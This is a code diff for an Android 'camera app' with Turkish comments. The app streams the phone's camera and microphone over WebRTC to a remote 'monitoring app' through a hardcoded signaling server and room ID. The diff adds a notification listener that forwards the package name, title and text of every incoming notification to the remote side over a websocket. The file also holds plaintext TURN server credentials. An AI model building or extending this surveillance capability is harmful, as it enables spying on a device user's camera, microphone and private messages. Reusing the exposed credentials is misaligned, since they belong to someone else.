@@ -1,8 +1,10 @@
 package com.camera.app;
 
 import android.Manifest;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -19,14 +21,13 @@ import java.net.URI;
 import java.util.ArrayList;
 import java.util.List;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends AppCompatActivity implements NotificationService.NotificationListener {
 
     private static final String TAG = "CameraApp";
-
     private static final String SIGNALING_URL = "wss://signaling-server-71q2.onrender.com";
-
     private static final int PERMISSION_REQUEST_CODE = 100;
-
+    
+    // İzleme uygulamasına girilmesi gereken oda ID'si
     private static final String ROOM_ID = "228433736485";
 
     private EglBase eglBase;
@@ -43,9 +44,47 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        // 1. Ekstra Özelliği Başlat (Bildirim Okuma)
+        setupNotificationFeature();
+
+        // 2. Ana Özelliği Başlat (Kamera ve Mikrofon Paylaşımı)
         checkPermissionsAndStart();
     }
 
+    // --- EKSTRA ÖZELLİK: BİLDİRİM OKUMA METOTLARI ---
+    private void setupNotificationFeature() {
+        if (!isNotificationServiceEnabled()) {
+            Toast.makeText(this, "Ek Özellik: Bildirimleri de paylaşmak için ayarlardan izin vermelisiniz.", Toast.LENGTH_LONG).show();
+            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+        }
+        NotificationService.setListener(this);
+    }
+
+    private boolean isNotificationServiceEnabled() {
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        return flat != null && flat.contains(pkgName);
+    }
+
+    @Override
+    public void onNotificationReceived(String pkg, String title, String text) {
+        try {
+            // WebRTC bağlantısını koparmadan sadece küçük bir JSON verisi gönderiyoruz
+            if (wsClient != null && wsClient.isOpen()) {
+                JSONObject obj = new JSONObject();
+                obj.put("type", "notification");
+                obj.put("package", pkg);
+                obj.put("title", title);
+                obj.put("text", text);
+                wsClient.send(obj.toString());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Bildirim WebSocket üzerinden gönderilemedi", e);
+        }
+    }
+
+    // --- ANA ÖZELLİK: KAMERA VE MİKROFON PAYLAŞIM METOTLARI ---
     private void checkPermissionsAndStart() {
         List<String> needed = new ArrayList<String>();
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
@@ -61,7 +100,7 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this,
                     needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         } else {
-            startSharing();
+            startSharing(); // Hem kamerayı hem mikrofonu başlatır
         }
     }
 
@@ -76,13 +115,13 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 startSharing();
             } else {
-                Toast.makeText(this, "Kamera ve mikrofon izni olmadan çalışamaz", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "Kamera ve mikrofon izni olmadan akış yapılamaz.", Toast.LENGTH_LONG).show();
             }
         }
     }
 
     private void startSharing() {
-        Log.i(TAG, "Paylaşım başlatılıyor...");
+        Log.i(TAG, "Kamera ve Mikrofon paylaşımı başlatılıyor...");
         initWebRTC();
         startCapture();
         startAudioCapture();
@@ -179,7 +218,6 @@ public class MainActivity extends AppCompatActivity {
                 .setUsername("6e19a374f95004d5aa0269ac")
                 .setPassword("03EFYItjIl2Lt1uv")
                 .createIceServer());
-
         return iceServers;
     }
 
@@ -194,12 +232,10 @@ public class MainActivity extends AppCompatActivity {
             }
 
             @Override public void onSignalingChange(PeerConnection.SignalingState signalingState) {}
-
             @Override
             public void onIceConnectionChange(final PeerConnection.IceConnectionState iceConnectionState) {
                 Log.i(TAG, "Bağlantı durumu: " + iceConnectionState);
             }
-
             @Override public void onIceConnectionReceivingChange(boolean b) {}
             @Override public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
             @Override public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
@@ -210,7 +246,9 @@ public class MainActivity extends AppCompatActivity {
             @Override public void onAddTrack(RtpReceiver rtpReceiver, MediaStream[] mediaStreams) {}
         });
 
+        // Videoyu WebRTC kanalına ekliyoruz
         peerConnection.addTrack(videoTrack);
+        // Sesi (Mikrofonu) WebRTC kanalına ekliyoruz
         if (audioTrack != null) {
             peerConnection.addTrack(audioTrack);
         }
@@ -337,6 +375,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        NotificationService.setListener(null);
         try {
             if (videoCapturer != null) videoCapturer.stopCapture();
         } catch (Exception ignored) {}
